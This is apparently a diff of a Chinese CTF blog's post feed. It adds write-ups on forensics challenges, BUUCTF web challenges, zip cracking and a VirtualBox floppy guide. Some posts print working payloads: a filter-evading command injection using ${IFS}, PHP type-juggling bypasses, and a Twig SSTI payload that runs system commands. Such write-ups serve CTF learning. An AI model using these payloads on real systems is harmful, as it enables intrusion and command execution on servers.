+<h1 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h1><p>用盘古石阅读器打开，搜索题目给出的图片的名字</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700345378.gif" class="" title="图片">
+
+<p>导出该图片，并查看该图片属性的详细信息，得到分辨率360x360</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-16573700345389.gif" class="" title="图片">
+
+
+
+<h1 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h1><p>题目要求是说让我们找到姜总的快递单号，那么试着搜索下关键字姜总</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737006076812.gif" class="" title="图片">
+
+<p>果然，在群组聊天中找到了快递单号</p>
+<h1 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h1><p>读题发现是内存取证，想到使用工具volatility，第一个要求我们获得taqi7的开机密码，于是用volatility跑跑看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 hashdump</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737008500914.gif" class="" title="图片">
+
+<p>找到了，发现是md5加密过的，md5解密</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737008501015.gif" class="" title="图片">得到开机密码anxinqi
+
+<h1 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h1><p>看下题目，要求我们查看进程号，volatility跑一下进程号看看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 pstree</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737010442218.gif" class="" title="图片">
+
+<p>看着这个很可疑，但我并不认识，上网搜一搜MagnetRAMCaptu</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737010442219.gif" class="" title="图片">
+
+<p>看到这里便可以放心提交答案了，查看下pid是2192</p>
+<h1 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h1><p>看题发现这个是磁盘性质的取证题了，于是用取证大师</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.jpg" class="" title="图片">
+
+<p>导出了三个文件，其中就有ppt</p>
+<p>word和ppt需要密码，还有一个是字典，立马想到了爆破，用passfab for word</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737014552022.gif" class="" title="图片">
+
+<p>文档密码是688561，打开没有发现什么，把ppt后缀改成docx也一样进行爆破</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737014552023.gif" class="" title="图片">
+
+<p>得到密码287fuweiuhfiute，改回后缀，输入密码打开，得到flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737014552024.gif" class="" title="图片">
+
+
+
+<h1 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h1><p>在e01文件中bitlocker解密出来，发现tc加密文件，寻找密钥</p>
+<p>根据题目提示，使用取证大师的工具：内存镜像解析工具进行解析</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737018007529.gif" class="" title="图片">
+
+<p>导出keyfile</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737018007531.gif" class="" title="图片">
+
+<p>新建案例，开始取证</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737018007530.gif" class="" title="图片">
+
+<p>发现哈哈哈.zip，导出该zip，直接暴力破解，得到密码991314</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737018007532.gif" class="" title="图片">
+
+<p>打开压缩包，得到flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010-165737018007533.gif" class="" title="图片">
+
+<p>flag{1349934913913991394cacacacacacc}</p>
+<h1 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h1><p> 将文件下载下来，然后将后缀改为”.zip”，拖入winrar中将配置文件AndroidManifest.xml解压出来。</p>
+<p>然后利用工具AXMLPrinter2将配置文件反编译，编译出来的文件内容中可以看到package字段如下图所示</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190538890.png" class="" title="image-20220709190538890">
+
+<p>所以flag为“exec.azj.kny.d.c”。</p>
+<h1 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h1><p>上题反编译出来的配置文件中有如下图所示内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190735776.png" class="" title="image-20220709190735776">
+
+<p>“android.intent.action.MAIN”则代表文集入口“属性”，外面一层的activity标签中的android name值就是入口程序</p>
+<p>所以flag为”minmtta.hemjcbm.ahibyws.MainActivity”.</p>
+<h1 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h1><p>将下载下来的文件拖入bytecode viewer中，根据上题的程序入口目录进去，可出现下图所示内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191141536.png" class="" title="image-20220709191141536">
+
+<p>根据代码大致就可以猜测base64解密的内容就是密文。</p>
+<p>所以flag为“aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6”</p>
+<h1 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h1><p>在bytecode viewer中可以看到很多被混淆加密的包，安全检测类很可能就在里面</p>
+<p>根据关键词查找发现如下内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191504565.png" class="" title="image-20220709191504565">
+
+<p>这应该就是与检测相关的一个类，但起不到检测的作用。再去上级目录看，看到class a中有下图所示关键字段</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191701294.png" class="" title="image-20220709191701294">
+
+<p>qemu是Android模拟器，用来模拟检测的，所以猜测这个类就是了。</p>
+<p>所以flag为“a”</p>
+<h1 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h1><p>题目提示有后门</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.gif" class="" title="图片">
+
+<p>d盾扫描获得flag</p>
+<h1 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h1><p>查看database.php发现密码与my_encrypt()有关，发现该函数在encrypt.php中将encrypt.php部署到本地环境中跑一下，获得flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202049506.png" class="" title="image-20220709202049506">
+
+
+
+<h1 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h1><p>在Channelorder.php和Channelorderlist.php中都有盐值即$key</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202224818.png" class="" title="image-20220709202224818">
+]]></content>
+      <categories>
+        <category>比赛</category>
       </categories>
       <tags>
         <tag>misc</tag>
-        <tag>pwn</tag>
-        <tag>web</tag>
-        <tag>Crypto</tag>
+        <tag>取证</tag>
       </tags>
   </entry>
   <entry>
@@ -300,7 +453,6 @@
 ]]></content>
       <categories>
         <category>比赛复现</category>
-        <category>2022</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -357,8 +509,8 @@
 ]]></content>
       <categories>
         <category>刷题</category>
-        <category>web题集</category>
         <category>笔记</category>
+        <category>web题集</category>
         <category>web笔记</category>
       </categories>
       <tags>
@@ -381,7 +533,6 @@
 ]]></content>
       <categories>
         <category>比赛</category>
-        <category>2022</category>
       </categories>
       <tags>
         <tag>misc</tag>
@@ -414,7 +565,6 @@
 ]]></content>
       <categories>
         <category>比赛</category>
-        <category>2022</category>
       </categories>
       <tags>
         <tag>misc</tag>
@@ -444,7 +594,6 @@
 ]]></content>
       <categories>
         <category>比赛</category>
-        <category>2022</category>
       </categories>
       <tags>
         <tag>misc</tag>
@@ -468,7 +617,6 @@
 ]]></content>
       <categories>
         <category>比赛</category>
-        <category>2022</category>
       </categories>
       <tags>
         <tag>misc</tag>
@@ -510,7 +658,6 @@
 ]]></content>
       <categories>
         <category>比赛</category>
-        <category>2022</category>
       </categories>
       <tags>
         <tag>misc</tag>
@@ -532,7 +679,6 @@
 ]]></content>
       <categories>
         <category>比赛</category>
-        <category>2022</category>
       </categories>
       <tags>
         <tag>misc</tag>
@@ -721,6 +867,117 @@
 <p><a href="https://blog.csdn.net/m0_64815693/article/details/125539527?spm=1001.2014.3001.5502">(27条消息) Bugku 秋名山车神_没有名字了。。的博客-CSDN博客</a></p>
 <p><a href="https://blog.csdn.net/qq_43088815/article/details/90214217">(27条消息) python re模块(正则表达式) sub()函数详解_leo的学习之旅的博客-CSDN博客_python sub函数</a></p>
 <p><a href="https://blog.csdn.net/jly164260234/article/details/83215924">(27条消息) Python—re.findall的用法_扫地di的博客-CSDN博客_python re.findall()用法</a></p>
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>web题集</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF [WUSTCTF2020]朴实无华</title>
+    <url>/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
+    <content><![CDATA[<p>进入题目，发现有乱码问题</p>
+<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223043353.png" class="" title="image-20220812223043353">
+
+<p>解决后发现这串字符的中文是“人间极乐bot”</p>
+<p>（一开始以为是.git泄露扫了半天啥也不是555）</p>
+<p>bot想到了robots.txt所以进行了尝试</p>
+<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223221029.png" class="" title="image-20220812223221029">
+
+<p>根据提示继续访问，可却得到的是flag{this_is_not_flag}</p>
+<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223408944.png" class="" title="image-20220812223408944">
+
+<p>回想刚才的robots.txt页面显示是一个header果断（大佬提示）bp抓包观察</p>
+<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223544964.png" class="" title="image-20220812223544964">
+
+<p>果然有所收获访问一下看看</p>
+<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812223925726.png" class="" title="image-20220812223925726">
+
+<p>又有乱码问题不过不重要，关键的代码没乱就行，大体可以看出有三关，接下来进入主菜我们一步一步分析</p>
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>payload：?num&#x3D;11e3</p>
+<p>第一关的考点是强制类型转换的利用（个人认为）</p>
+<p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值</p>
+<p>​           在这里存在一个问题即利用科学记数法时如果没有计算则进行强制类型转换否则先计算在提取；</p>
+<p>eg：intval(11e3)输出&#x3D;&#x3D;》11 </p>
+<p>​		intval(11e3+1)输出&#x3D;&#x3D;》11001</p>
+<p>这样就能绕过intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>payload：md5&#x3D;0e215962017</p>
+<p>第二部分考md5目的是加密前后的值“&#x3D;&#x3D;”相等</p>
+<p>一开始以为是数组绕过尝试后发现不行，所以使用经过查找发现md5值为0e215962017时加密前后值相等（都是0）</p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>payload: get_flag&#x3D;tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</p>
+<p>最后一步命令执行；但是不能使用cat和空格，</p>
+<p>当然能查看的命令有很多eg：tac，more，less，nl，vi，vim等这里就不一一列举</p>
+<p>空格可以用${IFS}绕过</p>
+<p>先利用ls指令查出flag所在的位置</p>
+<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812230018477.png" class="" title="image-20220812230018477">
+
+<p>之后便可查到flag了</p>
+<img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812230059556.png" class="" title="image-20220812230059556">
+
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>web题集</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF [BJDCTF2020]Cookie is so stable</title>
+    <url>/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/</url>
+    <content><![CDATA[<h1 id="BUUCTF-BJDCTF2020-Cookie-is-so-stable"><a href="#BUUCTF-BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="BUUCTF [BJDCTF2020]Cookie is so stable"></a>BUUCTF [BJDCTF2020]Cookie is so stable</h1><p><strong>这是一道关于php的SSTI注入</strong></p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175404154.png" class="" title="image-20220811175404154">
+
+<p>这是检测ssti的一张思路图看不懂的小伙伴后面会有详解不要慌张；</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>从题目看出这题应该解题的关键在于cookie</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175546406.png" class="" title="image-20220811175546406">
+
+<p>查看提示（hint下f12）</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175641303.png" class="" title="image-20220811175641303">
+
+<p>用bp抓包查看，发现在输入id登陆后cookie中出现了一个可控变量user</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811175951417.png" class="" title="image-20220811175951417">
+
+<p>所以猜想后端接受到user输入后在进行输出类似一个模板所以想到了ssti注入（非官方思路猜想）</p>
+<p>之后根据测试图测试发现是Twig模板</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180220745.png" class="" title="image-20220811180220745">
+
+
+
+
+
+
+
+
+
+<h1 id="关于模板判断的方法及回显"><a href="#关于模板判断的方法及回显" class="headerlink" title="关于模板判断的方法及回显"></a>关于模板判断的方法及回显</h1><p>首先利用${7*7}进行测试，我们发现在页面上未进行一个算数运算，所以往下走</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180358818.png" class="" title="image-20220811180358818">
+
+<p>利用49测试</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180633572.png" class="" title="image-20220811180633572">
+
+<p>发现这里发生了运算，也就是图中下路中间部分的情况，这时候就要判断它是twig，还是jinja2</p>
+<p>也就是利用49</p>
+<p>如果是twig则返回结果应该是计算后的结果，反之亦然；</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811180341890.png" class="" title="image-20220811180341890">
+
+<p>jinja2下测试49回显如下</p>
+<img src="/2022/08/12/buuctf_%5BBJDCTF2020%5DCookieIsSoStable/image-20220811181059123.png" class="" title="image-20220811181059123">
+
+<p>（场景来源bugku-Simple_SSTI_1）</p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -953,8 +1210,8 @@
       <categories>
         <category>刷题</category>
         <category>笔记</category>
-        <category>ctfshow刷题</category>
         <category>web笔记</category>
+        <category>ctfshow刷题</category>
       </categories>
       <tags>
         <tag>web</tag>
@@ -1211,6 +1468,102 @@
       </tags>
   </entry>
   <entry>
+    <title>关于Oracle VM VirtualBox如何使用软驱的问题</title>
+    <url>/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>近期做到了一道题目，里面需要用到在虚拟机上挂载软盘的知识，查阅了一些资料，在这里进行一个总结。</p>
+<p>首先打开虚拟机，选择新建</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps7.jpg" class="" title="img"> 
+
+<p>在这里经过一些尝试，发现必须指定好系统的类型和版本，点击下一步，内存大小自定义，再下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps8.jpg" class="" title="img"> 
+
+<p>在这里需要创建虚拟硬盘，下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps9.jpg" class="" title="img"> 
+
+<p>直接下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps10.jpg" class="" title="img"> 
+
+<p>给固定大小就行，下一步的文件位置和大小自定义，这样就创建好了</p>
+<p>再点击刚刚创建的虚拟机的设置</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps11.jpg" class="" title="img"> 
+
+<p>点击储存</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps12.jpg" class="" title="img"> 
+
+<p>点击左下方的加号</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps13.jpg" class="" title="img"> 
+
+<p>点击软盘，它就会多出了一个控制器</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps14.jpg" class="" title="img"> 
+
+<p>点击右方加号</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps15.jpg" class="" title="img"> 
+
+<p>点击注册</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps16.jpg" class="" title="img"> 
+
+<p>将自己的软盘放进去，点击ok保存就好</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps17.jpg" class="" title="img"> 
+
+<p>最后将虚拟机启动就可以了</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>其它笔记</category>
+      </categories>
+      <tags>
+        <tag>其它</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>各种压缩包的加密</title>
+    <url>/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
+<p>第一个a.zip</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
+
+<p>看了下有三个文件，1.txt，2.txt</p>
+<p>按照套路应该是CRC32爆破没错了，试试看</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
+
+<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
+<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
+<p>第二个f.zip</p>
+<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
+
+<p>五位数字爆破成功密码是61825</p>
+<p>第三个g.zip</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
+
+<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
+<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
+
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
+
+<p>进行明文爆破，成功</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
+
+<p>第四个压缩包l.zip</p>
+<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
+
+<p>能够解压</p>
+<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
